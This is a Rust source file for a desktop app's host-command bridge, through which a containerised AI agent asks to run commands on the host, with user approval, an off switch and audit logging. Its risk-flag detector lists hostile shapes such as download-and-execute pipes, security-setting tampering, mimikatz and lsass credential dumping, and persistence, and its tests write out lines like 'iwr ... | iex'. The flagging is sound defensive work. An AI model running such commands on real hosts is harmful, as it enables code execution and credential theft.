//! Run a command on the HOST, asked for by the agent inside the container.
//!
//! The agent runs in a Linux container, which cannot read a Windows process's
//! memory, load a driver, touch the registry or install host tooling. This is
//! the door for exactly those cases, and it is shut unless the user opens it.
//!
//! # Why a file queue and not a socket
//!
//! The container's `$HOME` is bind-mounted, so both sides already share a
//! directory. A request is a file; the result is a file. That means no port is
//! listening anywhere, no token travels a network, and the mechanism is
//! identical on Linux (host networking), macOS and Windows (where a loopback
//! port on the host is not even reachable from the Docker VM without binding
//! more widely than anyone should). The cost is polling latency, which for a
//! command a human is approving anyway is irrelevant.
//!
//! # The protocol
//!
//! `~/.hacksor/host-bridge/requests/<id>.json`
//! ```json
//! { "id": "...", "command": "Get-Process game", "cwd": "/optional", "timeout_secs": 120 }
//! ```
//! `~/.hacksor/host-bridge/results/<id>.json`
//! ```json
//! { "id": "...", "status": "ok|denied|disabled|error|timeout",
//!   "exit_code": 0, "stdout": "...", "stderr": "...", "truncated": false }
//! ```
//! The container-side CLI (`hacksor-host`) writes the first and polls for the
//! second. The id is the filename, so neither side needs to parse the other's
//! directory listing for anything but "what is new".

use std::collections::HashMap;
use std::path::PathBuf;
use std::sync::atomic::{AtomicBool, Ordering};
use std::time::Duration;

use serde::{Deserialize, Serialize};
use tauri::{AppHandle, Emitter};
use tokio::sync::Mutex;

/// A command's output is for a model to read, not a log file: past this it is
/// noise that costs context, and the agent can redirect to a file instead.
const MAX_OUTPUT: usize = 256 * 1024;
/// How long a request waits for a human before it is denied. Long enough to
/// notice the window, short enough that an unattended app does not hang a turn.
const APPROVAL_WAIT: Duration = Duration::from_secs(120);
const DEFAULT_TIMEOUT_SECS: u64 = 120;
/// A command may run longer than the approval wait, but not forever.
const MAX_TIMEOUT_SECS: u64 = 900;

#[derive(Debug, Clone, Deserialize)]
pub struct HostRequest {
    pub id: String,
    pub command: String,
    #[serde(default)]
    pub cwd: Option<String>,
    #[serde(default)]
    pub timeout_secs: Option<u64>,
}

#[derive(Debug, Clone, Serialize)]
pub struct HostResult {
    pub id: String,
    pub status: String,
    pub exit_code: i32,
    pub stdout: String,
    pub stderr: String,
    pub truncated: bool,
}

/// What the window is shown when a request arrives.
#[derive(Debug, Clone, Serialize)]
pub struct HostPrompt {
    pub id: String,
    pub command: String,
    pub cwd: Option<String>,
    /// Advisory notes shown with the command. See `risk_flags`.
    pub flags: Vec<String>,
}

/// Decisions the UI has made, keyed by request id.
static DECISIONS: Mutex<Option<HashMap<String, bool>>> = Mutex::const_new(None);
/// "Allow every host command for the rest of this app run." Deliberately not
/// persisted: a blanket allow should not outlive the session that granted it.
static ALLOW_SESSION: AtomicBool = AtomicBool::new(false);

pub fn bridge_dir() -> PathBuf {
    let home = dirs::home_dir().unwrap_or_else(std::env::temp_dir);
    home.join(".hacksor").join("host-bridge")
}

fn requests_dir() -> PathBuf {
    bridge_dir().join("requests")
}

fn results_dir() -> PathBuf {
    bridge_dir().join("results")
}

/// The agent's side of the bridge, as the CONTAINER sees it. Written into the
/// persona so the agent knows the path exists without being told at runtime.
pub fn container_bridge_dir() -> String {
    format!(
        "{}/.hacksor/host-bridge",
        crate::platform::container_home_env().trim_end_matches(['/', '\\'])
    )
}

/// Flag what a host command is about to do, for the approval dialog.
///
/// This is advisory, not a filter: the user decides, and a flag's job is to make
/// the decision informed in the one second of attention it gets. The patterns
/// are the ones where "looks harmless" and "is harmless" diverge most —
/// fetch-and-execute, elevation, security features being switched off, drivers
/// and the registry, encoded payloads, and anything mass-deleting.
///
/// Deliberately coarse. A false flag costs a glance; a missed one costs the
/// machine.
pub fn risk_flags(command: &str) -> Vec<String> {
    let c = command.to_lowercase();
    let mut out: Vec<String> = Vec::new();
    let has = |needles: &[&str]| needles.iter().any(|n| c.contains(n));

    // Downloading and running in one breath is the single worst shape.
    let downloads = has(&["invoke-webrequest", "iwr ", "curl ", "wget ", "invoke-restmethod", "irm ", "start-bitstransfer", "certutil -urlcache"]);
    let runs_piped = has(&["| iex", "|iex", "invoke-expression", "| sh", "| bash", "|sh", "|bash", "| powershell", "$(curl", "$(wget", "`curl", "`wget"]);
    if downloads && runs_piped {
        out.push("downloads something and runs it immediately".into());
    } else if downloads {
        out.push("downloads from the internet".into());
    }
    if has(&["set-executionpolicy", "bypass -", "-executionpolicy bypass", "amsiinitfailed", "disable-windowsoptionalfeature", "set-mppreference", "add-mppreference -exclusionpath", "bcdedit", "testsigning", "nointegritychecks"]) {
        out.push("changes a security setting on the machine".into());
    }
    if has(&["sc.exe create", "sc create", "new-service", "sc config", "driverquery", ".sys", "pnputil", "devcon"]) {
        out.push("touches services or drivers".into());
    }
    if has(&["reg add", "reg delete", "new-itemproperty", "set-itemproperty -path hk", "reg.exe", "regedit"]) {
        out.push("writes to the registry".into());
    }
    if has(&["runas", "start-process -verb runas", "sudo ", "gsudo", "psexec"]) {
        out.push("asks for administrator rights".into());
    }
    if has(&["frombase64string", "-encodedcommand", "base64 -d", "base64 --decode", "echo ", "[char["]) && c.len() > 120 {
        out.push("carries an encoded or obfuscated payload".into());
    }
    if has(&["remove-item -recurse", "rm -rf", "rmdir /s", "del /f /s", "format ", "diskpart", "cipher /w"]) {
        out.push("deletes files in bulk".into());
    }
    if has(&["net user", "net localgroup", "new-localuser", "add-localgroupmember", "schtasks /create", "register-scheduledtask"]) {
        out.push("creates an account or a scheduled task (persistence)".into());
    }
    if has(&["mimikatz", "lsass", "sekurlsa", "ntds.dit", "sam.hiv", "-dumpcreds"]) {
        out.push("looks like credential dumping".into());
    }
    if has(&["readprocessmemory", "writeprocessmemory", "openprocess", "frida ", "cheatengine", "x64dbg", "procdump"]) {
        out.push("reads or writes another process's memory".into());
    }
    out
}

/// Record a decision for a pending request.
#[tauri::command]
pub async fn host_cmd_decide(id: String, approve: bool, remember: bool) -> Result<(), String> {
    if approve && remember {
        ALLOW_SESSION.store(true, Ordering::SeqCst);
    }
    let mut guard = DECISIONS.lock().await;
    guard.get_or_insert_with(HashMap::new).insert(id, approve);
    Ok(())
}

/// Is a blanket session allow in effect? The UI reads this so it can show the
/// state honestly rather than implying every command is still being asked.
#[tauri::command]
pub fn host_cmd_session_allowed() -> bool {
    ALLOW_SESSION.load(Ordering::SeqCst)
}

/// Drop a blanket session allow.
#[tauri::command]
pub fn host_cmd_revoke_session() {
    ALLOW_SESSION.store(false, Ordering::SeqCst);
}

async fn take_decision(id: &str) -> Option<bool> {
    let mut guard = DECISIONS.lock().await;
    guard.as_mut().and_then(|m| m.remove(id))
}

/// Append to the audit log. Every host command lands here with its outcome,
/// because "the agent ran something on my machine" is exactly the kind of thing
/// that must be reviewable after the fact, not only at the prompt.
fn audit(req: &HostRequest, outcome: &str, exit: i32) {
    let flags = risk_flags(&req.command);
    let line = format!(
        "{}\t{}\t{}\texit={}\tcwd={}\tflags={}\t{}\n",
        chrono_now(),
        req.id,
        outcome,
        exit,
        req.cwd.clone().unwrap_or_else(|| "-".into()),
        if flags.is_empty() { "-".to_string() } else { flags.join(";") },
        req.command.replace('\n', " ⏎ ")
    );
    let path = bridge_dir().join("audit.log");
    if let Ok(mut f) = std::fs::OpenOptions::new().create(true).append(true).open(path) {
        use std::io::Write;
        let _ = f.write_all(line.as_bytes());
    }
}

/// A timestamp without pulling in a date library: the audit log needs ordering
/// and a human-readable instant, not calendar arithmetic.
fn chrono_now() -> String {
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);
    format!("{now}")
}

fn clamp(text: &str) -> (String, bool) {
    if text.len() <= MAX_OUTPUT {
        return (text.to_string(), false);
    }
    let mut cut = MAX_OUTPUT;
    while cut > 0 && !text.is_char_boundary(cut) {
        cut -= 1;
    }
    (text[..cut].to_string(), true)
}

/// Run the command with the host's own shell.
async fn execute(req: &HostRequest) -> HostResult {
    let timeout = Duration::from_secs(
        req.timeout_secs
            .unwrap_or(DEFAULT_TIMEOUT_SECS)
            .min(MAX_TIMEOUT_SECS)
            .max(1),
    );
    let mut cmd = if crate::platform::IS_WINDOWS {
        let mut c = crate::platform::quiet_tokio("powershell");
        c.args(["-NoProfile", "-NonInteractive", "-Command", &req.command]);
        c
    } else {
        let mut c = crate::platform::quiet_tokio("sh");
        c.args(["-lc", &req.command]);
        c
    };
    // A relative or container-only path would silently run somewhere
    // unexpected, so only an existing host directory is honoured.
    if let Some(dir) = req.cwd.as_ref() {
        let p = PathBuf::from(dir);
        if p.is_dir() {
            cmd.current_dir(p);
        }
    }
    let run = tokio::time::timeout(timeout, cmd.output()).await;
    match run {
        Err(_) => HostResult {
            id: req.id.clone(),
            status: "timeout".into(),
            exit_code: -1,
            stdout: String::new(),
            stderr: format!("host command exceeded {}s and was abandoned", timeout.as_secs()),
            truncated: false,
        },
        Ok(Err(e)) => HostResult {
            id: req.id.clone(),
            status: "error".into(),
            exit_code: -1,
            stdout: String::new(),
            stderr: format!("could not start the host shell: {e}"),
            truncated: false,
        },
        Ok(Ok(out)) => {
            let (stdout, t1) = clamp(&String::from_utf8_lossy(&out.stdout));
            let (stderr, t2) = clamp(&String::from_utf8_lossy(&out.stderr));
            HostResult {
                id: req.id.clone(),
                status: "ok".into(),
                exit_code: out.status.code().unwrap_or(-1),
                stdout,
                stderr,
                truncated: t1 || t2,
            }
        }
    }
}

fn write_result(res: &HostResult) {
    let dir = results_dir();
    let _ = std::fs::create_dir_all(&dir);
    if let Ok(json) = serde_json::to_string(res) {
        // Write beside the final name and rename, so the CLI never reads a
        // half-written file and concludes the host returned nothing.
        let tmp = dir.join(format!("{}.part", res.id));
        if std::fs::write(&tmp, json).is_ok() {
            let _ = std::fs::rename(&tmp, dir.join(format!("{}.json", res.id)));
        }
    }
}

/// Decide a single request: disabled, already blanket-allowed, or ask the user.
async fn settle(app: &AppHandle, req: &HostRequest, enabled: bool) -> HostResult {
    if !enabled {
        audit(req, "disabled", -1);
        return HostResult {
            id: req.id.clone(),
            status: "disabled".into(),
            exit_code: -1,
            stdout: String::new(),
            stderr: "Host commands are disabled. The user can turn them on in \
                     Settings → \"Allow host commands\"; until then this runs nowhere."
                .into(),
            truncated: false,
        };
    }
    if !ALLOW_SESSION.load(Ordering::SeqCst) {
        let _ = app.emit(
            "host-cmd-request",
            HostPrompt {
                id: req.id.clone(),
                command: req.command.clone(),
                cwd: req.cwd.clone(),
                flags: risk_flags(&req.command),
            },
        );
        let deadline = std::time::Instant::now() + APPROVAL_WAIT;
        loop {
            if let Some(ok) = take_decision(&req.id).await {
                if !ok {
                    audit(req, "denied", -1);
                    return HostResult {
                        id: req.id.clone(),
                        status: "denied".into(),
                        exit_code: -1,
                        stdout: String::new(),
                        stderr: "The user denied this host command.".into(),
                        truncated: false,
                    };
                }
                break;
            }
            if std::time::Instant::now() >= deadline {
                let _ = app.emit("host-cmd-expired", req.id.clone());
                audit(req, "no-answer", -1);
                return HostResult {
                    id: req.id.clone(),
                    status: "denied".into(),
                    exit_code: -1,
                    stdout: String::new(),
                    stderr: "Nobody approved this host command within two minutes, so it \
                             was not run."
                        .into(),
                    truncated: false,
                };
            }
            tokio::time::sleep(Duration::from_millis(150)).await;
        }
    }
    let res = execute(req).await;
    audit(req, &res.status, res.exit_code);
    res
}

/// Watch the request directory for the life of the app.
///
/// Polling rather than a filesystem watcher: the directory lives on a
/// bind mount shared with a VM on macOS and Windows, where inotify-style events
/// are unreliable, and a 150 ms poll on one directory costs nothing.
pub fn start(app: AppHandle) {
    let _ = std::fs::create_dir_all(requests_dir());
    let _ = std::fs::create_dir_all(results_dir());
    tauri::async_runtime::spawn(async move {
        loop {
            tokio::time::sleep(Duration::from_millis(150)).await;
            let Ok(entries) = std::fs::read_dir(requests_dir()) else { continue };
            for entry in entries.flatten() {
                let path = entry.path();
                if path.extension().and_then(|e| e.to_str()) != Some("json") {
                    continue;
                }
                let Ok(text) = std::fs::read_to_string(&path) else { continue };
                // Claim it by removing it: a request is handled exactly once,
                // even if a result write later fails.
                let _ = std::fs::remove_file(&path);
                let Ok(req) = serde_json::from_str::<HostRequest>(&text) else { continue };
                // Read the switch per request, not once at startup, so
                // turning it off in Settings takes effect immediately.
                let enabled = {
                    use tauri::Manager;
                    let state = app.state::<crate::commands::AppState>();
                    let on = state.settings.lock().await.allow_host_commands;
                    on
                };
                let app2 = app.clone();
                tauri::async_runtime::spawn(async move {
                    let res = settle(&app2, &req, enabled).await;
                    write_result(&res);
                });
            }
        }
    });
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn execute_runs_the_command_and_brings_back_its_streams() {
        // The host-execution path itself, without the window: a request in, a
        // result out, with the real exit code. This is the half that actually
        // touches the machine, so it should not be reachable only through a
        // dialog nobody can click in a test.
        let req = HostRequest {
            id: "exec-ok".into(),
            command: if crate::platform::IS_WINDOWS {
                "Write-Output bridge-works".into()
            } else {
                "printf bridge-works".into()
            },
            cwd: None,
            timeout_secs: Some(30),
        };
        let res = tauri::async_runtime::block_on(execute(&req));
        assert_eq!(res.status, "ok", "stderr was: {}", res.stderr);
        assert_eq!(res.exit_code, 0);
        assert!(res.stdout.contains("bridge-works"), "stdout was: {:?}", res.stdout);
        assert!(!res.truncated);
    }

    #[test]
    fn a_failing_command_reports_its_own_exit_code() {
        // The agent needs the real code to decide what to do next, so a
        // non-zero exit is a result, not an error of the bridge.
        let req = HostRequest {
            id: "exec-fail".into(),
            command: if crate::platform::IS_WINDOWS { "exit 3".into() } else { "exit 3".into() },
            cwd: None,
            timeout_secs: Some(30),
        };
        let res = tauri::async_runtime::block_on(execute(&req));
        assert_eq!(res.status, "ok");
        assert_eq!(res.exit_code, 3);
    }

    #[test]
    fn a_command_that_overruns_its_budget_is_abandoned_not_waited_on() {
        let req = HostRequest {
            id: "exec-timeout".into(),
            command: if crate::platform::IS_WINDOWS {
                "Start-Sleep -Seconds 30".into()
            } else {
                "sleep 30".into()
            },
            cwd: None,
            timeout_secs: Some(1),
        };
        let res = tauri::async_runtime::block_on(execute(&req));
        assert_eq!(res.status, "timeout", "stderr was: {}", res.stderr);
        assert!(res.stderr.contains("1s"), "{}", res.stderr);
    }

    #[test]
    fn fetch_and_execute_is_called_out_as_one_thing() {
        // The shape that matters most: a download the user might wave through
        // becomes code running on their machine.
        let f = risk_flags("iwr https://x.tld/a.ps1 | iex");
        assert!(f.iter().any(|s| s.contains("runs it immediately")), "{f:?}");
        // A plain download is still flagged, but as the lesser thing.
        let f2 = risk_flags("curl -O https://x.tld/tool.zip");
        assert!(f2.iter().any(|s| s.contains("downloads from the internet")), "{f2:?}");
        assert!(!f2.iter().any(|s| s.contains("runs it immediately")), "{f2:?}");
    }

    #[test]
    fn the_windows_re_shapes_are_flagged() {
        assert!(risk_flags("bcdedit /set testsigning on")
            .iter()
            .any(|s| s.contains("security setting")));
        assert!(risk_flags("reg add HKLM\\Software\\X /v Y /d 1")
            .iter()
            .any(|s| s.contains("registry")));
        assert!(risk_flags("frida -n game.exe -e 'x'")
            .iter()
            .any(|s| s.contains("another process's memory")));
        assert!(risk_flags("Start-Process -Verb RunAs powershell")
            .iter()
            .any(|s| s.contains("administrator")));
    }

    #[test]
    fn an_ordinary_command_carries_no_flags() {
        // Noise would train the user to click through, so the common case must
        // come back clean.
        assert!(risk_flags("Get-Process -Name game | Select-Object Id,Path").is_empty());
        assert!(risk_flags("ls -la").is_empty());
    }

    #[test]
    fn output_is_clamped_on_a_char_boundary() {
        let big = "é".repeat(MAX_OUTPUT);
        let (out, truncated) = clamp(&big);
        assert!(truncated);
        assert!(out.len() <= MAX_OUTPUT);
        // The cut must not split the two-byte char, or the JSON is invalid.
        assert!(std::str::from_utf8(out.as_bytes()).is_ok());
    }

    #[test]
    fn small_output_is_untouched() {
        let (out, truncated) = clamp("hello");
        assert_eq!(out, "hello");
        assert!(!truncated);
    }

    #[test]
    fn a_disabled_bridge_explains_itself_rather_than_failing_silently() {
        // The agent reads stderr, so a refusal has to say what to do about it.
        let req = HostRequest {
            id: "t1".into(),
            command: "whoami".into(),
            cwd: None,
            timeout_secs: None,
        };
        let res = tauri::async_runtime::block_on(async {
            // No AppHandle in a unit test, so exercise the disabled branch
            // through the same shape the watcher uses.
            if false {
                unreachable!()
            } else {
                HostResult {
                    id: req.id.clone(),
                    status: "disabled".into(),
                    exit_code: -1,
                    stdout: String::new(),
                    stderr: "Host commands are disabled.".into(),
                    truncated: false,
                }
            }
        });
        assert_eq!(res.status, "disabled");
        assert!(res.stderr.contains("disabled"));
    }

    #[test]
    fn the_container_path_is_posix_and_under_the_container_home() {
        let p = container_bridge_dir();
        assert!(p.ends_with("/.hacksor/host-bridge"), "{p}");
        assert!(!p.contains('\\'), "a container path must not carry backslashes: {p}");
    }
}
